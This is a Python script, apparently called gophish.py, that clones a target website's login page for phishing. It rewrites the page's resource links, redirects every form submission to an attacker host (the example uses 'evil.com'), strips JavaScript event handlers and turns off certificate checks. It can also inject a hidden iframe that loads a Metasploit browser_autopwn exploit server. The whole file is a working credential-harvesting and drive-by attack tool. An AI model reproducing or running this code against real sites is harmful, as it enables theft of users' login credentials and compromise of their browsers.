import re
import mechanize
import sys
import cherrypy
import datetime
import argparse
import ssl
from bs4 import BeautifulSoup

# Build argument list for running the script
parser = argparse.ArgumentParser(prog='gophish.py', 
	formatter_class=argparse.ArgumentDefaultsHelpFormatter,
	description='Download and replace values in a site\'s HTML to setup a phishing site.',
	epilog='Example: gophish.py --phish https://www.victim.com/login.php --replace https://www.evil.com --outfile victim.html')
parser.add_argument('--phish', 
	required=True,
	help='the full URL to phish back to the victim (must include http(s)://)')
parser.add_argument('--replace', 
	required=True,
	help='the IP/FQDN to replace FORM actions with (must include http(s):// and final /)')
parser.add_argument('--outfile', 
	default='phishlog.txt',
	help='log file to store submitted form values')
parser.add_argument('--autopwn', 
	help='Metasploit auxiliary/server/browser_autopwn URL to inject as an iFrame')
parser.add_argument('--autofill', 
	help='file to use to autosubmit autocomplete fields')
parser.add_argument('--useragent', 
	help='file to use to pass a user agent value in the request')
parser.add_argument('--cookie', 
	help='send a cookie or cookies in the request')
parser.add_argument('--sendcookies', 
	action='store_const',
	const=1,
	default=1,
	help='initiate a connection, get the cookies, send cookies back in second connection')
parser.add_argument('--proxy',
        default='noproxy',
        help='access the page to be phished via a proxy')
parser.add_argument('--proxyport',
        default='noproxy',
        help='proxy port')
parser.add_argument('--proxyuser',
        default='',
        help='username for the proxy')
parser.add_argument('--proxypass',
        default='',
        help='password for the proxy')
parser.set_defaults(logfile='phish.html', sendcookie=0)

# Hold argument values in args
args = vars(parser.parse_args())

# Find necessary portions of phish target and attack target.
# This includes protocol (http or https), FQDN, and the URI for each
phishsource = args['phish']
phishhost = args['replace']
phishget = phishsource.rsplit('/', 1)[0]+'/'
htype = phishget.split(':', 1)[0]
stype = phishhost.split(':', 1)[0]
remhttp = phishget.split(':', 1)[1]
sremhttp = phishhost.split(':', 1)[1]
domainget = remhttp.split('/', 1)[1].split('/', 1)[1].split('/', 1)[0]
hostget = sremhttp.split('/', 1)[1].split('/', 1)[1].split('/', 1)[0]
phishfile = args['outfile']
redirecte = ''
redirectr = ''
clickfiles = dict()
proxy = args['proxy']
proxyport = args['proxyport']
proxyuser = args['proxyuser']
proxypass = args['proxypass']
proxycreds = ''

# Create a mechanized browser to connect to the phish target and grab the response
browse = mechanize.Browser()
browse.set_handle_robots(False)

# Disable certificate validation, mostly for if using a proxy
try:
  _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
  pass
else:
  ssl._create_default_https_context = _create_unverified_https_context

# Setup proxy if used
if re.search('^noproxy', proxy) is None:
  if re.search('[a-zA-Z0-9]', proxyuser) is not None and re.search('[a-zA-Z0-9]', proxyport) is not None:
    proxycreds = proxyuser + ':' + proxypass + '@'

  if re.search('^noproxy', proxyport) is None:
    browse.set_proxies({
      "http" : proxycreds + proxy + ':' + proxyport,
      "https" : proxycreds + proxy + ':' + proxyport,})
  else:
    browse.set_proxies({
      "http" : proxycreds + proxy,
      "https" : proxycreds + proxy,})

  if re.search('[a-zA-Z0-9]', proxyuser) is not None and re.search('[a-zA-Z0-9]', proxyport) is not None:
    browse.add_proxy_password(proxyuser, proxypass)

# Determine if user agent was set,
# if so then set argument, otherwise it is empty
if args['useragent'] is not None:
  uafile = open(args['useragent'], 'r')
  uaheader = uafile.readline()
  browse.addheaders = [('User-Agent', uaheader)]
  uafile.close()

# if cookie option was set, then send the cookie in the connection
if args['cookie'] is not None and args['useragent'] is not None:
  browse.addheaders.append('Cookie', args['cookie'])
else:
  browse.addheaders = [('Cookie', args['cookie'])]

# if sendcookies option was enabled, then connect,
# grab the cookies, and use them in the second connection
if args['sendcookies'] == 1:
  cookies = mechanize.LWPCookieJar()
  browse.set_cookiejar(cookies)
  browse.open(phishsource)

browse.open(phishsource)
phishpage = browse.response().read()
browse.close()

# Use Beautiful soup to handle the HTML response
soup = BeautifulSoup(phishpage, "lxml")

# If autopwn has been configured, implement functionality
if args['autopwn'] is not None:
  # First perform regex to make sure halfway proper link was submitted
  if re.search('^(http|https)\:\/\/[a-zA-Z0-9]+', args['autopwn']):
    # Build frame for HTML response and store in BeautifulSoup object
    evilframe = '<iframe width="10" scrolling="no" height="1" frameborder="0" src="'+args['autopwn']+'" seamless="seamless">'
    evilsoup = BeautifulSoup(evilframe)

    # Inject the evil frame into the original response
    for tag in evilsoup.findAll('iframe'):
      tag.extract()
      soup.body.insert(len(soup.body.contents), tag)

# Remove any javascript onsubmits that might interfere with the links
for linkonsub in soup.find_all('a', {"onsubmit":True}):
  linkonsub['onsubmit'] = ''

# Loop through all links found in HTML response, 
# replace with full links back to phish host
for link in soup.find_all('a'):
  if link.get('href') is not None and re.search('^#', link.get('href')) is None:
    if re.search('^javascript\:', link.get('href')) is None:
      if re.search('^(mailto|http|https|//|#$)', link.get('href')) is None:
        if re.search('^\/', link.get('href')):  
          link['href'] = htype+'://'+domainget+link.get('href')
        else:
          link['href'] = phishget+link.get('href')
    else:
      link['onclick'] = ''

# Loop through all images found in HTML response, 
# replace with full link to image on phish host
for img in soup.find_all('img'):
  if img.get('src') is not None:
    if re.search('^(http|https|//)', img.get('src')) is None:
      if re.search('^\/', img.get('src')): 
        img['src'] = htype+'://'+domainget+img.get('src')
      else:
        img['src'] = phishget+img.get('src')

# Loop through all style link tags found in HTML response, 
# replace with full link to css file on phish host
for styler in soup.find_all('link'):
  if re.search('^(http|https|//)', styler.get('href')) is None:
    if re.search('^\/', styler.get('href')):
      styler['href'] = htype+'://'+domainget+styler.get('href')
    else:
      styler['href'] = phishget+styler.get('href')

# Loop through all script tags found in HTML response, 
# replace with full link to script on phish host
for scripter in soup.find_all('script', {"src":True}):
  if re.search('^(http|https|//)', scripter.get('src')) is None:
    if re.search('^\/', scripter.get('src')): 
      scripter['src'] = htype+'://'+domainget+scripter.get('src')
    else:
      scripter['src'] = phishget+scripter.get('src')

# Loop through all embed tags found in HTML response, 
# replace with full link to script on phish host
for embedded in soup.find_all('embed', {"src":True}):
  if re.search('^(http|https|//)', embedded.get('src')) is None:
    if re.search('^\/', embedded.get('src')): 
      embedded['src'] = htype+'://'+domainget+embedded.get('src')
    else:
      embedded['src'] = phishget+embedded.get('src')

# Loop through all param tags found in HTML response, 
# replace with full link to script on phish host
for paramval in soup.find_all('param', {"value":True}):
  if re.search('^(http|https|//)', paramval.get('value')) is None:
    if re.search('^\/', paramval.get('value')): 
      paramval['src'] = htype+'://'+domainget+paramval.get('value')
    else:
      paramval['src'] = phishget+paramval.get('value')

# Loop through all meta tags found in HTML response, 
# replace with full link to phish host
for meta in soup.find_all('meta', {"content":True}):
  if re.search('^(http|https|//)', meta.get('content')) is None:
    if re.search('^\/', meta.get('content')) and re.search('\.', meta.get('content')): 
      meta['content'] = htype+'://'+domainget+meta.get('content')
    elif re.search('\.', meta.get('content')):
      meta['content'] = phishget+meta.get('content')

# Remove any javascript onsubmits that might interfere with the input
for inputonsub in soup.find_all('input', {"onsubmit":True}):
  inputonsub['onsubmit'] = ''

# Remove any javascript onclicks that might interfere with the input
for inputonclick in soup.find_all('input', {"onclick":True}):
  inputonclick['onclick'] = ''

# Remove any javascript onkeypresses that might interfere with the input
for inputkeypress in soup.find_all('input', {"onkeypress":True}):
  inputkeypress['onkeypress'] = ''

# Loop through all input tags found in HTML response, 
# replace src with full link to script on phish host
for inputer in soup.find_all('input', {"src":True}):
  if re.search('^(http|https|//)', inputer.get('src')) is None:
    if re.search('^\/', inputer.get('src')): 
      inputer['src'] = htype+'://'+domainget+inputer.get('src')
    else:
      inputer['src'] = phishget+inputer.get('src')

# Remove any javascript onclicks that might interfere with the form
for formonclick in soup.find_all('form', {"onclick":True}):
  formonclick['onclick'] = ''

# Remove any javascript onkeypresses that might interfere with the form
for formkeypress in soup.find_all('form', {"onkeypress":True}):
  formkeypress['onkeypress'] = ''

# Loop through all forms found in HTML response, 
# replace action with our attacking system
for form in soup.find_all('form'):
  if re.search('^(http|https|//)', form.get('action')) is None:
    if re.search('^\/', form.get('action')): 
      form['action'] = stype+'://'+hostget+form.get('action')
    else:
      form['action'] = stype+'://'+hostget+'/'+form.get('action')
  else:
    form['action'] = stype+'://'+hostget+'/'+form.get('action').split('/', 1)[1].split('/', 1)[1].split('/', 1)[1]

  # If the autofill feature was enabled, then open the autofill file
  # and inject each hidden autofill input type into the form
  if args['autofill'] is not None:
    autofile = open(args['autofill'], 'r')

    for line in autofile:
      if re.match('^#', line) is None:
        autoform = soup.new_tag(line)
        form.insert(0, autoform)

    autofile.close()

phishHtml = soup.prettify(formatter="html")

# BeautifulSoup fixes broken HTML, I do not want this to happen for &amp;
phishHtml = re.sub('&amp;', '&', phishHtml)

# Rewrite CSS url(), first look for all matches
urlCSS = re.findall(r'url\((.*)\)', phishHtml)

# Loop through matches and replace
for urls in urlCSS:
  if re.search('\)', urls):
    urls = urls.split(')')[0]

  checkQuotes = re.search('(\'|\")', urls)
  urlValue = ''
  useQuotes = ''

  # If quotes were used, remove the as part of the string
  # but add them around the URL
  if checkQuotes is not None:
    urlValue = str(urls)[1:-1]
    useQuotes = '"'
  else:
    urlValue = str(urls)
  
  # If preceeded by a forward slash, remove make sure we do not double slash
  if re.search('^(http|https|//)', urls) is not None:
    if re.search('^\/', urls):
      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget[:-1]+urlValue+useQuotes+')', phishHtml)
    else:
      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget+urlValue+useQuotes+')', phishHtml)

phishWrite = open(phishfile, 'w')
phishWrite.write(phishHtml.encode('utf-8').strip())
phishWrite.close()